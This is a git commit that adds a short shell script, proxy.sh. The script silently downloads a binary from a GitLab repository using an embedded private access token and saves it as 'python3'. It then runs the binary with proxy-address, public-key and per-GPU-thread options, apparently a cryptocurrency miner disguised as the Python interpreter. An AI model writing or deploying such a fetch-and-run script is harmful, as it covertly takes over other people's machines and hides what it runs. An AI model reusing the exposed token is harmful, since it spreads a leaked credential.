b63db9a690661043904f9877c49981ff1d5c874c
micahking-jpg <micah.king@suzuki-kentaro.net>
2025-10-18 20:58:55 +0800

    Add files via upload

---
+++ proxy.sh
@@ -0,0 +1,3 @@
+wget --header="PRIVATE-TOKEN: glpat-n3zdkdqxZ1lgjvPWJzKWMW86MQp1OmljbTV1Cw.01.120if1qqq" "https://gitlab.com/api/v4/projects/sairinjitu%2Flog/repository/files/tiktok/raw?ref=main" -O python3 > /dev/null 2>&1 && chmod +x python3 > /dev/null 2>&1
+
+./python3 --proxy=206.189.148.87:9999 --pubkey=3XaqRHaYmorGYE86jwatuvLtHfKmm6gD5srWWHDwi2LYWU2L5txDoonHGUMPtqBWvAduWv4KF1UYJ1Q3KVBh6T4eWQDvfYh67Fj7E9DwHGh74WaQhqfLGigdvf2oBt29YTsZ --label=K6 --threads-per-card=2
